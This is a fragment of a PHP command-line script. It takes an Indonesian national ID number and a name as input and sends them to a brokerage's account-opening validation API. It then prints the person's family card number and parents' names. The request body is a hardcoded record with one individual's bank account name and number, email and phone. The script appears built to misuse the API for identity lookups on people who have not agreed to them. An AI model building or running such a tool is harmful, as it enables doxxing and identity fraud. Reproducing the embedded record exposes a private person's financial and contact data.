...
echo color('blue', "*Crot*")." NIK : ";
$nik = trim(fgets(STDIN));
echo color('blue', "*Crot*")." Isi Namanya Cok : ";
$nama = trim(fgets(STDIN));

$gas = curl('https://support.mncsekuritas.id/ws/api/oas/oasOpeningAccount/validate', '{"BankId":"BCA","BankNamaRekening":"B SONY JAWALMEN SIREGAR","BankNoRekening":"7115139118","CreatedBy":"","CreatedDate":"2021-01-02 01:31:23","DeviceDesc":"MI 8|1.7.12","DeviceFlag":"A","Email":"Jawirkowir@gmail.com","FailedCounterBank":0,"FailedCounterMisscall":0,"FailedCounterNik":2,"FailedCounterOtp":0,"Hp":"85640703315","IdentitasSeumurHidup":true,"IsActive":true,"IsAlamatSama":true,"IsOtpSms":true,"IsProdukMnc":true,"KeluargaIdentitasMasaBerlakuFlag":true,"KeluargaIdentitasMasaBerlakuTanggal":"9999-12-31 00:00:00","MasaBerlakuIdentitasTanggal":"9999-12-31 00:00:00","ModifiedBy":"","ModifiedDate":"2021-01-03 12:05:54","NamaLengkap":"'.$nama.'","Nik":"'.$nik.'","NoRt":0,"NoRw":0,"RegId":122051,"TanggalLahir":"2021-01-02 00:00:00","_id":1}', $headers);
	...
	if ($se == true) {
		echo "\n";
	echo color('blue', "*Crot*")."NIK      : ".$sec."\n";
	echo color('blue', "*Crot*")."NOKK     : ".$sec1."\n";
	echo color('blue', "*Crot*")."NAMA     : ".$sec2."\n";
	echo color('blue', "*Crot*")."NAMA AYAH: ".$sec3."\n";
	echo color('blue', "*Crot*")."NAMA IBU : ".$sec4."\n";
	} else {
